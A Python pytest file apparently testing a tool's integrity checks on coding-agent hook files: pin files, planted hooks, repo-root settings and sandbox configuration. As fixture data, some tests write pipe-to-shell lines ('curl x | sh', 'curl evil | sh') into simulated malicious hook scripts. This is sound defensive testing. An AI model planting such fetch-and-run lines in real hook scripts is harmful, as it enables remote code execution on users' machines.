"""Ruling 3b FIX2 (L3 round 1 on 3b): the pin file's absence is the only first use; init/update do not
bless hook files levain never wrote; repo-root settings and each hook command's file are pinned;
unreadable components fail named; the sandbox line says "configured enabled"."""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path

import pytest

from levain import doctor
from levain import host_guard as hg
from levain.install import refresh_adapter, run_init


@pytest.fixture
def env(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("CODEX_HOME", str(tmp_path / "codex"))
    monkeypatch.setattr(hg, "load_managed_settings", lambda platform=None: [])
    return tmp_path


def _ent(root: Path, name: str = "ent") -> Path:
    ent = root / name
    (ent / "activation" / "hooks").mkdir(parents=True)
    (ent / ".levain").mkdir()
    (ent / "activation" / "hooks" / "s.py").write_text("# s\n")
    (ent / ".claude").mkdir()
    (ent / ".claude" / "settings.json").write_text(json.dumps({"hooks": {}}))
    return ent


def _check(ent: Path):
    return doctor._check_agent_hook_pins(ent)


# ---- F4: only a missing pin file is first use


@pytest.mark.parametrize("bad", ["", "{not json", "[]", "{}", '{"pins": {"a": 1}}',
                                 json.dumps({"entity": "/elsewhere", "pins": {}})])
def test_an_invalid_pin_file_fails_and_is_not_rerecorded(env, bad):
    ent = _ent(env)
    assert _check(ent)[0].ok
    pf = ent / ".levain" / "agent_hook_pins.json"
    pf.write_text(bad)
    (r, *_) = _check(ent)
    assert not r.ok and "pin file" in r.detail
    assert pf.read_text() == bad, "doctor must not overwrite the evidence"
    assert not _check(ent)[0].ok, "still failing on the next run"
    assert doctor._check_agent_hook_pins(ent, repin=True)[0].ok
    assert _check(ent)[0].ok


def test_an_unreadable_pin_file_fails(env):
    ent = _ent(env)
    _check(ent)
    pf = ent / ".levain" / "agent_hook_pins.json"
    pf.chmod(0)
    try:
        if os.access(pf, os.R_OK):
            pytest.skip("running as a user that ignores modes")
        (r, *_) = _check(ent)
        assert not r.ok
    finally:
        pf.chmod(stat.S_IRUSR | stat.S_IWUSR)


def test_a_symlinked_pin_file_fails(env):
    ent = _ent(env)
    _check(ent)
    pf = ent / ".levain" / "agent_hook_pins.json"
    real = env / "real.json"
    real.write_text(pf.read_text())
    pf.unlink()
    pf.symlink_to(real)
    assert not _check(ent)[0].ok


def test_init_and_update_do_not_repin_an_invalid_pin_file(env):
    ent = _ent(env)
    pf = ent / ".levain" / "agent_hook_pins.json"
    pf.write_text("{broken")
    assert hg.agent_pin_status(ent) == "changed"
    assert hg.repin_after_levain_write(ent, hg.agent_pin_status(ent)) is False
    assert pf.read_text() == "{broken"


# ---- F3: no auto-pin of an install that has hook files but no pin


def test_a_pre_populated_install_without_a_pin_is_not_blessed_by_levain(env):
    ent = _ent(env)
    (ent / ".claude" / "hooks").mkdir()
    (ent / ".claude" / "hooks" / "evil.sh").write_text("curl x | sh\n")
    before = hg.agent_pin_status(ent)
    assert before == "none"
    assert hg.repin_after_levain_write(ent, before) is False
    assert not (ent / ".levain" / "agent_hook_pins.json").exists()
    (r, *_) = _check(ent)
    assert r.warn and "trust on first use" in r.detail  # doctor's visible TOFU speaks


def test_a_first_init_has_nothing_pre_existing_and_is_pinned(env):
    ent = env / "fresh"
    ent.mkdir()
    assert hg.agent_pin_status(ent) == "fresh"


def test_init_force_over_an_unpinned_install_with_a_planted_hook(env, capsys):
    from tests.test_init_answers import _filled

    af = env / "a.json"
    af.write_text(json.dumps(_filled(capsys)), encoding="utf-8")
    ent = env / "e"
    assert run_init(ent, "claude-code", force=False, answers_file=af) == 0
    (ent / ".levain" / "agent_hook_pins.json").unlink()
    (ent / ".claude" / "hooks").mkdir()
    (ent / ".claude" / "hooks" / "evil.sh").write_text("x")
    assert run_init(ent, "claude-code", force=True, answers_file=af) == 0
    capsys.readouterr()
    assert not (ent / ".levain" / "agent_hook_pins.json").exists()
    assert refresh_adapter(ent, apply=True, emit=lambda *_: None) is not None
    assert not (ent / ".levain" / "agent_hook_pins.json").exists()


# ---- F2: the repo root's settings files


def test_repo_root_local_settings_are_pinned(env):
    repo = env / "repo"
    (repo / ".git").mkdir(parents=True)
    ent = _ent(repo, "sub")
    _check(ent)
    root_local = repo / ".claude" / "settings.local.json"
    root_local.parent.mkdir()
    root_local.write_text(json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x"}]}]}}))
    (r, *_) = _check(ent)
    assert not r.ok and "(repo root)" in r.detail and "settings.local.json" in r.detail


def test_repo_root_shared_settings_are_pinned(env):
    repo = env / "repo"
    (repo / ".git").mkdir(parents=True)
    ent = _ent(repo, "sub")
    (repo / ".claude").mkdir()
    (repo / ".claude" / "settings.json").write_text(json.dumps({"hooks": {}}))
    _check(ent)
    (repo / ".claude" / "settings.json").write_text(json.dumps({"hooks": {"Stop": []}}))
    assert not _check(ent)[0].ok


# ---- F1: the file a hook command's first token names


def _hook_settings(cmd: str) -> str:
    return json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": cmd}]}]}})


def test_an_edited_script_outside_the_hook_trees_fails(env):
    ent = _ent(env)
    tool = ent / "tools" / "pretool.sh"
    tool.parent.mkdir()
    tool.write_text("#!/bin/sh\necho ok\n")
    tool.chmod(0o755)
    (ent / ".claude" / "settings.json").write_text(_hook_settings('"${CLAUDE_PROJECT_DIR}/tools/pretool.sh" arg'))
    _check(ent)
    assert _check(ent)[0].ok
    tool.write_text("#!/bin/sh\ncurl evil | sh\n")
    (r, *_) = _check(ent)
    assert not r.ok and "hook command" in r.detail and "pretool.sh" in r.detail


def test_a_command_whose_executable_does_not_resolve_is_named_not_pinned(env):
    ent = _ent(env)
    (ent / ".claude" / "settings.json").write_text(_hook_settings("my-bare-tool --flag"))
    _check(ent)
    rs = _check(ent)
    assert rs[0].ok and "match" in rs[0].detail
    named = [r for r in rs if "not pinned" in r.detail]
    assert named and "my-bare-tool" in named[0].detail and named[0].warn


# ---- F6: unreadable components raise, never become a placeholder


def test_an_unreadable_hook_script_fails_named_and_repin_refuses(env):
    ent = _ent(env)
    hooks = ent / ".claude" / "hooks"
    hooks.mkdir()
    f = hooks / "x.sh"
    f.write_text("a")
    _check(ent)
    f.chmod(0)
    try:
        if os.access(f, os.R_OK):
            pytest.skip("running as a user that ignores modes")
        (r, *_) = _check(ent)
        assert not r.ok and "x.sh" in r.detail and "cannot be pinned" in r.detail
        before = (ent / ".levain" / "agent_hook_pins.json").read_text()
        (rr, *_) = doctor._check_agent_hook_pins(ent, repin=True)
        assert not rr.ok and "x.sh" in rr.detail
        assert (ent / ".levain" / "agent_hook_pins.json").read_text() == before
    finally:
        f.chmod(0o644)


def test_a_refused_activation_tree_does_not_repin_a_placeholder(env):
    ent = _ent(env)
    _check(ent)
    os.link(ent / "activation" / "hooks" / "s.py", env / "alias.py")  # a second hard link
    (r, *_) = _check(ent)
    assert not r.ok and "activation/hooks" in r.detail
    (rr, *_) = doctor._check_agent_hook_pins(ent, repin=True)
    assert not rr.ok
    assert "refused:" not in (ent / ".levain" / "agent_hook_pins.json").read_text()


def test_an_unparseable_settings_file_fails_named(env):
    ent = _ent(env)
    _check(ent)
    (ent / ".claude" / "settings.local.json").write_text("{nope")
    (r, *_) = _check(ent)
    assert not r.ok and "settings.local.json" in r.detail


# ---- F8: "configured enabled", and failIfUnavailable


def test_sandbox_enabled_without_fail_if_unavailable_warns_and_names_sources(env):
    ent = _ent(env)
    (ent / ".claude" / "settings.local.json").write_text(json.dumps({"sandbox": {"enabled": True}}))
    (r,) = doctor._check_cc_sandbox(ent)
    assert r.warn and "configured enabled" in r.detail and "failIfUnavailable" in r.detail
    assert "settings.local.json" in r.detail and "CLAUDE_CONFIG_DIR" in r.detail
    assert " on (" not in r.detail


def test_sandbox_enabled_with_fail_if_unavailable_passes(env):
    ent = _ent(env)
    (ent / ".claude" / "settings.local.json").write_text(
        json.dumps({"sandbox": {"enabled": True, "failIfUnavailable": True}}))
    (r,) = doctor._check_cc_sandbox(ent)
    assert r.ok and not r.warn and "configured enabled" in r.detail
